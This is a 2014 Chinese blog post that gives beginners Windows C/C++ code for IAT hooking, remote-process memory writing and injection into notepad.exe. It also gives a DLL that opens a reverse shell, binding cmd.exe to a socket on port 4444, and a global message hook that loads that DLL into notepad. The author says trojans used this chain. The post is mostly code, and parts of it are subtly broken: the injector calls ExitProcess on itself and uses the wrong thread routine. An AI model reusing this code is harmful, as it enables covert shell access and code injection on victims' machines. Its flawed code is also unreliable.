
---
title: "IAT HOOK代码和DLL注入代码"
date: 2014-04-21T09:13:30+08:00
draft: true
categories: ["Windows安全"]
tags: ["Windows安全"]
topics: ["Windows安全"]
---

写了几个简单程序，用于实现用户模式IAT Hook和dll注入，方便初学者学习。学东西的时候没有代码简直痛苦，看半天感觉无从下手，希望能帮助到大家。

<!--more-->


```


#include <windows.h> 
#include <winnt.h> 
#include <stdio.h> 

typedef int (*pMessageBox)(HWND , LPCSTR , LPCSTR , UINT );
pMessageBox OldMessageBox, NewMessageBox;

int WINAPI pNewMessageBox(HWND hWnd, LPCSTR caption, LPCSTR text, UINT code)
{
	ExitProcess(0);
	return 0;
}

void IATHook(DWORD base)
{
  PIMAGE_DOS_HEADER pDosHeader;  
  PIMAGE_NT_HEADERS pNtHeader; 
  IMAGE_OPTIONAL_HEADER32 OptionalHeader;
  IMAGE_DATA_DIRECTORY IATAddress; 
  PIMAGE_IMPORT_DESCRIPTOR pIID; 
  
  pDosHeader = (PIMAGE_DOS_HEADER)base;
  pNtHeader = (PIMAGE_NT_HEADERS)(base + pDosHeader-> e_lfanew);
  OptionalHeader = (IMAGE_OPTIONAL_HEADER32)pNtHeader-> OptionalHeader;
  IATAddress = (IMAGE_DATA_DIRECTORY)OptionalHeader.DataDirectory[1];
  pIID = (PIMAGE_IMPORT_DESCRIPTOR)(base + IATAddress.VirtualAddress);
 
  int number = IATAddress.Size/sizeof(IMAGE_IMPORT_DESCRIPTOR);
  for (int index = 0; index < number-1; index++)
  {
    PCSTR DllName = (PCSTR)(base + pIID[index].Name);
    if (strnicmp(DllName, "user32.dll", sizeof(DllName)) == 0)
    {
      PIMAGE_THUNK_DATA pINT = (PIMAGE_THUNK_DATA)(pIID[index].OriginalFirstThunk + base);
      PIMAGE_THUNK_DATA pIAT = (PIMAGE_THUNK_DATA)(pIID[index].FirstThunk + base);
      for (int index2 = 1; pINT!=NULL; index2++)
      {
	DWORD data = (DWORD)pINT-> u1.AddressOfData;
	if (!data) break;
	if ((data & (1<<31)) == 0)
	{
	  PIMAGE_IMPORT_BY_NAME pNAME = (PIMAGE_IMPORT_BY_NAME)(data + base);
	  if (strnicmp(pNAME-> Name, "MessageBoxA", sizeof("MessageBoxA"))==0)
	  {
	    OldMessageBox = (pMessageBox)pIAT-> u1.Function;
	    pIAT-> u1.Function = (DWORD)NewMessageBox;
	    pMessageBox temp = OldMessageBox;
	    OldMessageBox = NewMessageBox;
	    NewMessageBox = temp;
	  }
	}
	pINT = &pINT[index2];
	pIAT = &pIAT[index2];
      }
    }
  }
}

int main()
{
  HMODULE hModule = GetModuleHandle(NULL);
  NewMessageBox = (pMessageBox)pNewMessageBox;
  IATHook((DWORD)hModule);
  MessageBoxA(NULL, "TEST", "TEST", MB_OK);
  return 0;
}

```



```

#include <windows.h> 
#include <TlHelp32.h> 
#include <stdio.h> 

DWORD GetNotepadID()
{
  HANDLE hSnap = NULL;
  PROCESSENTRY32 pe = { sizeof(pe) };
  hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  if (!hSnap)
  {
    return 0;
  }
  if (Process32First(hSnap, &pe))
  {
    do
    {
      if (wcsncmp(pe.szExeFile, L"notepad.exe",  sizeof(pe.szExeFile)) == 0)
      {
        CloseHandle(hSnap);
	return pe.th32ProcessID;
      }
      pe.dwSize = sizeof(pe);
    } while (Process32Next(hSnap, &pe));
  }
  CloseHandle(hSnap);
  return 0;
}

DWORD UpRight(PTCHAR Privilege)
{
  BOOL rc = FALSE;
  HANDLE hToken;
  LUID luid;
  TOKEN_PRIVILEGES tokenPrivileges;
  DWORD dwProcID = GetCurrentProcessId();
  HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS,     FALSE, dwProcID);

  rc = OpenProcessToken(
    hProc, 
    TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY,
    &hToken);
  if (rc)
  {
    rc = LookupPrivilegeValue(NULL, Privilege, &luid);
    if (rc)
    {
      tokenPrivileges.PrivilegeCount = 1;
      tokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
      tokenPrivileges.Privileges[0].Luid = luid;
      rc = AdjustTokenPrivileges(
        hToken,
	FALSE,
	&tokenPrivileges,
	sizeof(tokenPrivileges),
	NULL,
	NULL);
      }
    }
    if (hToken) CloseHandle(hToken);
    if (hProc) CloseHandle(hProc);
    return rc;
  }

DWORD WriteShellcode(HANDLE hProcess)
{
  LPVOID szParam = VirtualAllocEx(hProcess, NULL, 20, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
  if (!szParam)
  {
    printf_s("VirtualAllocEx failed!\n");
    return -1;
  }
  else
  {
     printf_s("VirtualAllocEx success!\n");
  }
  if (!WriteProcessMemory(hProcess, szParam,  "loader.dll", sizeof("loader.dll"), NULL))
  {
    printf_s("WriteProcessMemory failed!\n");
    return -1;
  }
  else
  {
    printf_s("WriteProcessMemory succeed!\n");
  }
  LPTHREAD_START_ROUTINE address = (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "ExitProcess");
  if (!address)
  {
    printf_s("Get exit process error!\n");
    return -1;
  }
  else
  {
    address(NULL);
  }
  if (CreateRemoteThread(hProcess, 
	NULL, 
	NULL, 
	address,
	NULL, 
	0, 
	NULL))
  {
    printf_s("Create remote thread success!\n");
   } 
   else
   {
      printf_s("Create remote thread error!\n");
   }
   return 0;
}

int main()
{
  DWORD dwProcesID = GetNotepadID();
  if (dwProcesID == 0)
  {
    printf_s("Cannot find notepad!\n");
    return -1;
  }
  HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS,  FALSE, GetNotepadID());
  if (!hProcess)
  {
    printf_s("OpenProcess error!\n");
    return -1;
  }
  else
  {
    printf_s("Get process handle success!\n");
  }
  WriteShellcode(hProcess);
  return 0;
}

```


后面两个都是dll代码，其中一个dll用于启动加载第二个dll和调用其中的恶意函数，四五年前的好多木马都采用这种方式，多次跳转。


```

#include <winsock2.h> 
#include <stdio.h> 
#include <windows.h> 

#pragma comment(lib, "ws2_32.lib")
#define PORT 4444

extern "C" _declspec(dllexport) void Run(HWND hWnd);
DWORD WINAPI ThreadProc(LPVOID);

HANDLE hThread = NULL;
BOOL ret = FALSE;

 BOOL _stdcall DllMain(HINSTANCE hInstance, DWORD dwReason, LPWSTR lpReserved)
{
  switch (dwReason)
  {
    case DLL_PROCESS_DETACH:
      ret = TerminateThread(hThread, 0);
	if (!ret)
        {
	  MessageBox(NULL, L"TerminateThread error!", L"error",     MB_ICONERROR|MB_OK);
	}
	break;
	default:
	  break;
 }
 return TRUE;
}

void Run(HWND hWnd)
{
  SendMessage(hWnd, WM_CLOSE, NULL, NULL);
  hThread = CreateThread(NULL, 0, ThreadProc, NULL, 0, NULL);
  if (!hThread)
  {
    MessageBox(NULL, L"CreateThreadError!", L"error",     MB_ICONERROR|MB_OK);
  }
}
DWORD WINAPI ThreadProc(LPVOID lParam)
{
  WSADATA wsaData;
  WSAStartup(MAKEWORD(2,2), &wsaData);
  SOCKET sock;
  PROCESS_INFORMATION pi;
  STARTUPINFO si;
  sockaddr_in addr;
  memset(&addr, 0, sizeof(addr));
  memset(&pi, 0, sizeof(pi));
  memset(&si, 0, sizeof(si));
  addr.sin_port = htons(PORT);
  addr.sin_family = AF_INET;
  addr.sin_addr.S_un.S_addr = inet_addr("127.0.0.1");
  while (TRUE)
  {
    sock = socket(AF_INET, SOCK_STREAM, 0);
    while (!connect(sock, (const sockaddr*)&addr, sizeof(addr)))
    {
      shutdown(sock, 0);
      Sleep(1000);
    }
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW|STARTF_USESTDHANDLES;
    si.hStdInput = si.hStdError = si.hStdOutput = (void*)sock;
    memset(&pi, 0, sizeof(pi));
    ret = CreateProcess(NULL, 
	L"cmd.exe", 
	NULL, 
	NULL,
	FALSE, 
	0, 
	NULL,
	NULL,
	&si,
	&pi);
   WaitForSingleObject(pi.hProcess, INFINITE);
   closesocket(sock);
  }
  WSACleanup();
  return 0;
}

```



```

#include <stdio.h> 
#include <windows.h> 

LRESULT CALLBACK GetMsgProc(int, WPARAM, LPARAM);
extern "C" _declspec(dllexport) void SetHook(HWND);
extern "C" _declspec(dllexport) void UnHook();
HHOOK hHook;
HINSTANCE hInstance;

#pragma data_seg(".source")
HWND s_hWnd = NULL;
#pragma data_seg()

BOOL WINAPI DllMain(HINSTANCE hInst, DWORD dwReason, LPWSTR lpReserved)
{
  hInstance = hInst;
  return TRUE;
}

void SetHook(HWND hWnd)
{
  s_hWnd = hWnd;
  hHook = SetWindowsHookEx(WH_GETMESSAGE, GetMsgProc, hInstance, 0);
  if (!hHook)
  {
    MessageBox(NULL, L"SetWindowsHookEx Error!",   L"ERROR", MB_ICONERROR|MB_OK);
  }
}

void UnHook()
{
  UnhookWindowsHookEx(hHook);
}

LRESULT CALLBACK GetMsgProc(int code, WPARAM wParam, LPARAM lParam)
{
  CallNextHookEx(hHook, code, wParam, lParam);
  static bool first = TRUE;
  char szBuffer[MAX_PATH];
  memset(szBuffer, 0, sizeof(szBuffer));
  GetModuleFileNameA(NULL, szBuffer, MAX_PATH);
  char *name = _strupr("notepad.exe");
  char *now  = _strupr(_strdup(szBuffer));

  if (strstr(now, name) && first)
  {
    first = FALSE;
    HMODULE hDll = LoadLibraryA("HookedDll.dll");
    typedef void (*RUN)(HWND);
    RUN Run = (RUN)GetProcAddress(hDll, "Run");
    Run(s_hWnd);
  }
  return 0;
}

```

